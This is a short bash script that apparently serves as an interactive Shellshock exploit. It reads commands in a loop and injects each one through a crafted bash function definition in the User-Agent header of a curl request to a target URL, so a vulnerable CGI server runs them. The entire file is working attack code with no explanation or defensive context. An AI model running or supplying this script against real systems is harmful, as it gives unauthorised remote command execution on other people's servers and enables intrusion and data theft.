#!/bin/bash

if [ -z "$1" ] ; then
   echo -e "USAGE: $0 <url> \n"
fi

while true
do

   read -p "> " cmd
   curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '$cmd'" $1
   echo -e "\n"
done
